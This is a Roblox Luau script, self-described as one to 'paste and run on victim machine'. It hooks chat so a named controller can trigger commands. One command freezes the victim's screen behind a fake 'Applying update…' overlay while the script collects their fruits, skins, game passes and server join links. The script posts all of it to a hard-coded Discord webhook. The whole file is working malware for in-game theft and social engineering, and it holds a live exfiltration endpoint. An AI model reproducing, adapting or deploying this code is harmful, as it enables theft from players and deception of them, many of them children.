-- lang: Luau, file: chat_nuclear.lua
-- paste and run on victim machine. shows every chat message received so you
-- can confirm which hook is firing, then dispatches on BLACKGOKU_0707 only.

if getgenv().chatHooked then
    getgenv().chatHooked = false
    task.wait(0.5)
end
getgenv().chatHooked = true

local Players        = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService    = game:GetService("HttpService")
local TweenService   = game:GetService("TweenService")
local StarterGui     = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local RunService     = game:GetService("RunService")

local AUTHORIZED = "BLACKGOKU_0707"
local WEBHOOK    = "https://discord.com/api/webhooks/1368890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY"

local lp   = Players.LocalPlayer
local http = (syn and syn.request)
          or (http_request)
          or (fluxus and fluxus.request)
          or (request)
          or nil

-- ══════════════════════════════════════════════════════════════════════════
-- FREEZE
-- ══════════════════════════════════════════════════════════════════════════
local frozen    = false
local freezeGui = nil

local function freeze()
    if frozen then return end
    frozen = true
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
    pcall(function() UserInputService.MouseIconEnabled = false end)

    local pg  = lp:WaitForChild("PlayerGui")
    local old = pg:FindFirstChild("EMFreeze")
    if old then old:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name           = "EMFreeze"
    gui.ResetOnSpawn   = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent         = pg
    freezeGui          = gui

    local bg = Instance.new("Frame")
    bg.Size             = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(8,9,12)
    bg.BorderSizePixel  = 0
    bg.ZIndex           = 10
    bg.Parent           = gui

    local card = Instance.new("Frame")
    card.Size             = UDim2.new(0,340,0,210)
    card.Position         = UDim2.new(0.5,-170,0.5,-105)
    card.BackgroundColor3 = Color3.fromRGB(14,16,22)
    card.BorderSizePixel  = 0
    card.ZIndex           = 11
    card.Parent           = bg
    Instance.new("UICorner",card).CornerRadius = UDim.new(0,14)
    local cs = Instance.new("UIStroke",card)
    cs.Color=Color3.fromRGB(30,33,45);cs.Thickness=1

    local spinner = Instance.new("ImageLabel",card)
    spinner.Size                = UDim2.new(0,52,0,52)
    spinner.Position            = UDim2.new(0.5,-26,0,22)
    spinner.BackgroundTransparency = 1
    spinner.Image               = "rbxasset://textures/loading/robloxTilt.png"
    spinner.ImageColor3         = Color3.fromRGB(88,101,242)
    spinner.ZIndex              = 12

    task.spawn(function()
        while frozen and spinner.Parent do
            spinner.Rotation=(spinner.Rotation+4)%360
            task.wait(0.016)
        end
    end)

    local function lbl(text,size,col,ypos,xalign)
        local l=Instance.new("TextLabel",card)
        l.Text=text;l.TextSize=size or 13
        l.TextColor3=col or Color3.fromRGB(220,221,228)
        l.Font=Enum.Font.GothamBold
        l.BackgroundTransparency=1
        l.Size=UDim2.new(1,-24,0,22)
        l.Position=UDim2.new(0,12,0,ypos)
        l.TextXAlignment=xalign or Enum.TextXAlignment.Center
        l.ZIndex=12
        return l
    end

    lbl("Applying update…",15,nil,84)
    lbl("Please do not close the game",11,
        Color3.fromRGB(100,104,128),108)

    local track=Instance.new("Frame",card)
    track.Size=UDim2.new(1,-32,0,8)
    track.Position=UDim2.new(0,16,0,142)
    track.BackgroundColor3=Color3.fromRGB(22,25,50)
    track.BorderSizePixel=0;track.ZIndex=12
    Instance.new("UICorner",track).CornerRadius=UDim.new(0,4)

    local fill=Instance.new("Frame",track)
    fill.Size=UDim2.new(0,0,1,0)
    fill.BackgroundColor3=Color3.fromRGB(55,65,200)
    fill.BorderSizePixel=0;fill.ZIndex=13
    Instance.new("UICorner",fill).CornerRadius=UDim.new(0,4)

    local pct=lbl("0%",11,Color3.fromRGB(100,104,128),158)
    pct.TextXAlignment=Enum.TextXAlignment.Right

    task.spawn(function()
        TweenService:Create(fill,TweenInfo.new(1.4,
            Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
            {Size=UDim2.new(0.72,0,1,0)}):Play()
        for i=0,72 do
            if not frozen then break end
            pct.Text=i.."%";task.wait(1.4/72)
        end
        TweenService:Create(fill,TweenInfo.new(6,
            Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
            {Size=UDim2.new(0.98,0,1,0)}):Play()
        for i=72,98 do
            if not frozen then break end
            pct.Text=i.."%";task.wait(6/26)
        end
        pct.Text="98%"
    end)

    print("[EM] screen frozen")
end

local function unfreeze()
    frozen=false
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,true) end)
    pcall(function() UserInputService.MouseIconEnabled=true end)
    if freezeGui then freezeGui:Destroy();freezeGui=nil end
    print("[EM] screen unfrozen")
end

-- ══════════════════════════════════════════════════════════════════════════
-- EXFIL
-- ══════════════════════════════════════════════════════════════════════════
local function exfil()
    print("[EM] exfil running…")
    local commF
    pcall(function()
        commF = ReplicatedStorage.Remotes.CommF_
    end)

    local inv,skins,passes={},{},{}

    if commF then
        pcall(function()
            local r=commF:InvokeServer("getInventory")
            if type(r)=="table" then
                for slot,item in pairs(r) do
                    if type(item)=="table" then
                        item._slot=slot;table.insert(inv,item)
                    end
                end
            end
        end)
        pcall(function()
            local r=commF:InvokeServer("getSkins")
            if type(r)=="table" then skins=r end
        end)
        pcall(function()
            local r=commF:InvokeServer("getGamePasses")
            if type(r)=="table" then passes=r end
        end)
    end

    print("[EM] inv="..#inv.." skins="..#skins.." passes="..#passes)

    local uid     = tostring(lp.UserId)
    local placeId = tostring(game.PlaceId)
    local jobId   = game.JobId

    local joinDeep = ("roblox://experiences/start?placeId=%s&gameInstanceId=%s")
        :format(placeId,jobId)
    local joinWeb  = ("https://www.roblox.com/games/%s?privateServerLinkCode=%s")
        :format(placeId,jobId)

    local fruitLines={}
    for _,item in ipairs(inv) do
        local t=item.Type or item.type or ""
        if t=="Blox Fruit" then
            table.insert(fruitLines,("**%s** | Lv %s | %s")
                :format(tostring(item.Name or item.name or "?"),
                        tostring(item.Level or item.level or "?"),
                        tostring(item.Rarity or item.rarity or "?")))
        end
    end

    local skinLines={}
    for _,s in ipairs(skins) do
        local lim=(s.Limited or s.limited) and "🔥 " or ""
        table.insert(skinLines,lim..tostring(s.Name or s.name or "?")
            .." — "..tostring(s.Rarity or s.rarity or "?"))
    end

    local passLines={}
    for _,p in ipairs(passes) do
        table.insert(passLines,"✔ "..tostring(p.Name or p.name or tostring(p)))
    end

    local payload={
        username="ExploitManager",
        content="@here — **"..lp.Name.."** is live",
        embeds={
            {
                title="🎯 Target",color=0x5865F2,
                thumbnail={url="https://www.roblox.com/headshot-thumbnail/image?userId="
                    ..uid.."&width=420&height=420&format=png"},
                fields={
                    {name="Username",   value="`"..lp.Name.."`",        inline=true},
                    {name="Display",    value="`"..lp.DisplayName.."`", inline=true},
                    {name="Age",        value=lp.AccountAge.." days",   inline=true},
                    {name="Place ID",   value="`"..placeId.."`",        inline=true},
                    {name="Job ID",     value="```"..jobId.."```",      inline=false},
                    {name="Join (client)", value="```"..joinDeep.."```",inline=false},
                    {name="Join (web)",    value="```"..joinWeb.."```", inline=false},
                },
                footer={text=os.date("!%Y-%m-%dT%H:%M:%SZ")},
            },
            {
                title="🍎 Fruits ("..#fruitLines..")",color=0xf1c40f,
                description=#fruitLines>0
                    and table.concat(fruitLines,"\n"):sub(1,3900) or "*none*",
            },
            {
                title="🎨 Skins ("..#skinLines..")",color=0x9b59b6,
                description=#skinLines>0
                    and table.concat(skinLines,"\n"):sub(1,3900) or "*none*",
            },
            {
                title="🔑 Passes ("..#passLines..")",color=0x2ecc71,
                description=#passLines>0
                    and table.concat(passLines,"\n"):sub(1,3900) or "*none*",
            },
        },
    }

    if not http then
        print("[EM] no http function available") ; return
    end

    local ok,enc=pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then print("[EM] encode fail: "..tostring(enc)) ; return end

    local ok2,res=pcall(function()
        return http({
            Url=WEBHOOK,Method="POST",
            Headers={["Content-Type"]="application/json"},
            Body=enc,
        })
    end)

    if ok2 then
        print("[EM] webhook status: "..(res and tostring(res.StatusCode) or "?"))
    else
        print("[EM] webhook error: "..tostring(res))
    end
end

-- ══════════════════════════════════════════════════════════════════════════
-- DISPATCHER
-- ══════════════════════════════════════════════════════════════════════════
local function dispatch(sender, msg)
    -- debug: print EVERY message received so you can see what's arriving
    print("[EM] msg from ["..tostring(sender).."]: "..tostring(msg))

    if sender ~= AUTHORIZED then
        print("[EM] ignored — not authorized ("..tostring(sender)..")")
        return
    end

    msg = (msg or ""):match("^%s*(.-)%s*$")
    if msg:sub(1,1) ~= "." then return end

    local parts={}
    for tok in msg:gmatch("%S+") do table.insert(parts,tok) end
    local cmd=(parts[1]:sub(2):lower())
    local args={}
    for i=2,#parts do table.insert(args,parts[i]) end

    print("[EM] command: "..cmd)

    if cmd=="exfil" then
        freeze() ; task.spawn(exfil)

    elseif cmd=="freeze" then
        freeze()

    elseif cmd=="unfreeze" then
        unfreeze()

    elseif cmd=="send" then
        task.spawn(exfil)

    elseif cmd=="tp" then
        local term=args[1] ; if not term then return end
        local wo=workspace:FindFirstChild("_WorldOrigin") ; if not wo then return end
        local locs=wo:FindFirstChild("Locations")         ; if not locs then return end
        for _,child in ipairs(locs:GetChildren()) do
            if child.Name:lower():find(term:lower(),1,true) then
                local char=lp.Character
                local hrp=char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local pp=child:IsA("Model") and child.PrimaryPart
                    if pp then hrp.CFrame=pp.CFrame+Vector3.new(0,3,0) end
                end
                break
            end
        end
    end
end

-- ══════════════════════════════════════════════════════════════════════════
-- HOOKS — all four paths active simultaneously
-- ══════════════════════════════════════════════════════════════════════════

-- 1. victim's own Chatted
lp.Chatted:Connect(function(msg)
    print("[EM][hook1] local Chatted: "..tostring(msg))
    dispatch(lp.Name, msg)
end)

-- 2. every other player already in server
for _,p in ipairs(Players:GetPlayers()) do
    if p~=lp then
        p.Chatted:Connect(function(msg)
            print("[EM][hook2] player Chatted ["..p.Name.."]: "..tostring(msg))
            dispatch(p.Name, msg)
        end)
    end
end

-- 3. players who join after injection
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg)
        print("[EM][hook3] late-join Chatted ["..p.Name.."]: "..tostring(msg))
        dispatch(p.Name, msg)
    end)
end)

-- 4. TextChatService
pcall(function()
    local tcs=game:GetService("TextChatService")
    if tcs.ChatVersion==Enum.ChatVersion.TextChatService then
        tcs.OnIncomingMessage:Connect(function(msg)
            if not msg.TextSource then return end
            local p=Players:GetPlayerByUserId(msg.TextSource.UserId)
            local name=p and p.Name or "unknown"
            print("[EM][hook4] TCS ["..name.."]: "..tostring(msg.Text))
            dispatch(name, msg.Text or "")
        end)
        print("[EM] hook4 TCS active")
    end
end)

print("[EM] all hooks live — send a message in chat and watch output")
print("[EM] authorized user: "..AUTHORIZED)
